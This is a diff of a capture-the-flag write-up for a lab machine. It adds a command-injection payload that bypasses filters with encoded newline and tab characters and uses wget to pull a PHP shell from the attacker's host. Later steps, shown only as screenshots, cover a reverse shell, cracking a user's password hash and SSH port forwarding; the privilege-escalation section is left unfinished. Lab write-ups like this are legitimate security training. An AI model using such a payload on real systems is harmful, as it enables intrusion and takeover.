@@ -156,8 +156,56 @@ f (isset($_POST['backup']) && !empty($_POST['password'])) {
 - I bypassed the filters with the aid of `tab and the  \n newline char`.The payload below  uploads a php shell file into the  server using `wget`.
 
 ```bash
-%0awget%09http://10.10.14.110:8002/shell.php>#
+%0awget%09http://10.10.14.110:8002/shell.php%0a>#
 ```
+
+![image](https://github.com/user-attachments/assets/e609423f-159e-40df-833d-59384d134b87)
+
+- RCE-:
+
+![image](https://github.com/user-attachments/assets/60224c1d-8176-4ead-8547-8c93225e7e44)
+
+
+- Revshell as www-data-:
+
+![image](https://github.com/user-attachments/assets/6ec77328-13ac-431e-b7b0-5f2daefa246b)
+
+- I noticed a sqlite3 db used to store hashes for the web page.
+
+![image](https://github.com/user-attachments/assets/3fe34ae7-5bd7-4fde-bed9-32c1512a883d)
+
+- I cracked the hash for user `tobias`.
+
+![image](https://github.com/user-attachments/assets/2a5b751b-a5c7-423a-99c5-7a43ba6b5b20)
+
+- User Tobias-:
+
+![image](https://github.com/user-attachments/assets/9114a28a-488c-4dac-abbf-417ca4bbb8d8)
+
+----------------
+
+### PRIVESC WITH ISPCONFIG
+
+-----------------
+
+- I ran `netstat -antp` and noticed a service running internally on port 8080.
+
+![image](https://github.com/user-attachments/assets/81965b0d-499f-408f-af16-f48206c9c8f0)
+
+- I port forwarded it with `ssh`.
+
+![image](https://github.com/user-attachments/assets/038f5f9d-7910-4436-8f06-1194462c40e5)
+
+- 
+
+
+
+
+
+
+
+
+
 
 
 
